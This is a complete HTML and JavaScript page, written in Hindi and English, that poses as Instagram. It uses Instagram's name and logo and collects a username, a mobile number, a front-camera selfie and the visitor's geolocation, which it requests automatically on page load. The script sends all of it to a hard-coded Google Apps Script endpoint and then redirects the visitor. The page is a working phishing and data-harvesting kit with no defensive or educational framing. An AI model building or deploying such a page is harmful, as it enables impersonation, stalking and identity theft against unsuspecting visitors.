<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Welcome - Instagram</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #08001f, #25004d, #001f5c);
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.container {
    width: 100%;
    max-width: 420px;
    background: white;
    padding: 30px 25px;
    border-radius: 25px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.4);
    text-align: center;
}

.logo {
    width: 150px;
    max-width: 100%;
    border-radius: 20px;
    margin-bottom: 15px;
}

h1 {
    margin: 5px 0 10px;
    color: #222;
    font-size: 30px;
}

p {
    color: #666;
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 15px;
    margin-bottom: 15px;
    border: 1px solid #ddd;
    border-radius: 12px;
    font-size: 16px;
}

button {
    width: 100%;
    padding: 15px;
    margin-top: 10px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(90deg, #d600ff, #0066ff);
    color: white;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
}

button:disabled {
    opacity: 0.6;
}

#camera {
    width: 100%;
    display: none;
    margin-top: 15px;
    border-radius: 15px;
    background: #000;
}

#preview {
    width: 100%;
    display: none;
    margin-top: 15px;
    border-radius: 15px;
}

#canvas {
    display: none;
}

#status {
    margin-top: 15px;
    font-weight: bold;
    color: #333;
}
</style>
</head>

<body>

<div class="container">

    <!-- पहले वाली Instagram image -->
    <img
        src="Instagram.PNG"
        alt="Instagram"
        class="logo"
    >

    <h1>Welcome to Instagram</h1>

    <p>
        अपनी इच्छा से अपनी details, location और photo share करें।
    </p>

    <form id="myForm">

        <input
            type="text"
            id="username"
            placeholder="Enter Your Username"
            required
        >

        <input
            type="tel"
            id="mobile"
            placeholder="Enter Your Mobile No."
            required
        >

        <!-- CAMERA -->
        <button
            type="button"
            id="cameraBtn"
        >
            📷 Camera खोलें
        </button>

        <video
            id="camera"
            autoplay
            playsinline
        ></video>

        <!-- TAKE PHOTO -->
        <button
            type="button"
            id="photoBtn"
            style="display:none;"
        >
            📸 Photo लें
        </button>

        <!-- PHOTO PREVIEW -->
        <img
            id="preview"
            alt="Captured Photo"
        >

        <!-- SUBMIT -->
        <button
            type="submit"
            id="submitBtn"
        >
            Submit
        </button>

    </form>

    <canvas id="canvas"></canvas>

    <div id="status"></div>

</div>


<script>

/* =====================================
   GOOGLE APPS SCRIPT URL
===================================== */

const SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbx0CTxoo4h8BiYEmgO4-Wto2MjCkuUHJGYsIddTlkCXF2WxBckwWTcWUUXAxIiAiU-Y/exec";


let stream = null;
let photoData = "";
let locationData = "";


/* =====================================
   LOCATION
===================================== */

window.addEventListener("load", function () {

    if (!navigator.geolocation) {
        return;
    }

    navigator.geolocation.getCurrentPosition(

        function (position) {

            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;

            locationData =
                "https://www.google.com/maps?q=" +
                latitude + "," + longitude;

            document.getElementById("status").innerText =
                "Location permission मिल गई।";

        },

        function () {

            console.log(
                "Location permission not granted."
            );

        }

    );

});


/* =====================================
   OPEN CAMERA
===================================== */

document.getElementById("cameraBtn")
.addEventListener("click", async function () {

    try {

        if (
            !navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia
        ) {

            alert(
                "इस browser में Camera उपलब्ध नहीं है। Chrome में website खोलें।"
            );

            return;
        }


        stream =
            await navigator.mediaDevices.getUserMedia({

                video: {
                    facingMode: "user"
                },

                audio: false

            });


        const video =
            document.getElementById("camera");


        video.srcObject = stream;

        video.style.display = "block";


        document.getElementById("photoBtn")
        .style.display = "block";


        document.getElementById("cameraBtn")
        .innerText =
            "📷 Camera चालू है";


        document.getElementById("status")
        .innerText =
            "अब Photo लें।";

    }

    catch (error) {

        console.error(error);

        alert(
            "Camera permission नहीं मिली। Browser में Camera permission Allow करें और फिर दोबारा कोशिश करें।"
        );

    }

});


/* =====================================
   TAKE PHOTO
===================================== */

document.getElementById("photoBtn")
.addEventListener("click", function () {

    const video =
        document.getElementById("camera");

    const canvas =
        document.getElementById("canvas");

    const preview =
        document.getElementById("preview");


    if (
        !video.videoWidth ||
        !video.videoHeight
    ) {

        alert(
            "Camera अभी तैयार नहीं है। 1-2 सेकंड बाद फिर Photo लें।"
        );

        return;
    }


    canvas.width =
        video.videoWidth;

    canvas.height =
        video.videoHeight;


    const context =
        canvas.getContext("2d");


    context.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );


    /* Photo तैयार */

    photoData =
        canvas.toDataURL(
            "image/jpeg",
            0.85
        );


    /* Preview दिखाएँ */

    preview.src =
        photoData;

    preview.style.display =
        "block";


    /* Camera बंद */

    if (stream) {

        stream.getTracks().forEach(
            function (track) {
                track.stop();
            }
        );

        stream = null;
    }


    video.style.display =
        "none";


    document.getElementById("photoBtn")
    .style.display =
        "none";


    document.getElementById("cameraBtn")
    .innerText =
        "📷 Camera दोबारा खोलें";


    document.getElementById("status")
    .innerText =
        "✅ Photo ले ली गई। अब Submit करें।";

});


/* =====================================
   SUBMIT
===================================== */

document.getElementById("myForm")
.addEventListener("submit", async function (event) {

    event.preventDefault();


    const username =
        document.getElementById("username")
        .value.trim();


    const mobile =
        document.getElementById("mobile")
        .value.trim();


    const submitBtn =
        document.getElementById("submitBtn");


    /* Photo जरूरी */

    if (!photoData) {

        alert(
            "पहले Camera खोलकर Photo लें।"
        );

        return;
    }


    /* Username जरूरी */

    if (!username) {

        alert(
            "Username दर्ज करें।"
        );

        return;
    }


    /* Mobile जरूरी */

    if (!mobile) {

        alert(
            "Mobile number दर्ज करें।"
        );

        return;
    }


    submitBtn.disabled =
        true;

    submitBtn.innerText =
        "Submitting...";


    document.getElementById("status")
    .innerText =
        "Details, location और photo भेजी जा रही है...";


    /* Data */

    const data = {

        username: username,

        mobile: mobile,

        location: locationData,

        photo: photoData

    };


    try {

        const response =
            await fetch(
                SCRIPT_URL,
                {

                    method: "POST",

                    headers: {
                        "Content-Type":
                        "text/plain;charset=utf-8"
                    },

                    body:
                        JSON.stringify(data)

                }
            );


        const result =
            await response.json();


        console.log(result);


        /* SUCCESS */

        if (result.success === true) {

            document.getElementById("status")
            .innerText =
                "✅ Submission successful!";


            /*
             * Submit सफल होने के बाद
             * success.html खुलेगा
             */

            setTimeout(function () {

                window.location.href =
                    "success.html";

            }, 500);

        }

        /* FAILED */

        else {

            submitBtn.disabled =
                false;

            submitBtn.innerText =
                "Submit";


            document.getElementById("status")
            .innerText =
                "❌ Submission नहीं हो पाई।";


            alert(
                "Submission failed: " +
                (result.error || "Unknown error")
            );

        }

    }

    catch (error) {

        console.error(error);


        submitBtn.disabled =
            false;

        submitBtn.innerText =
            "Submit";


        document.getElementById("status")
        .innerText =
            "❌ Server से connection नहीं हो पाया।";


        alert(
            "Server से connection नहीं हो पाया। Apps Script deployment check करें।"
        );

    }

});

</script>

</body>
</html>
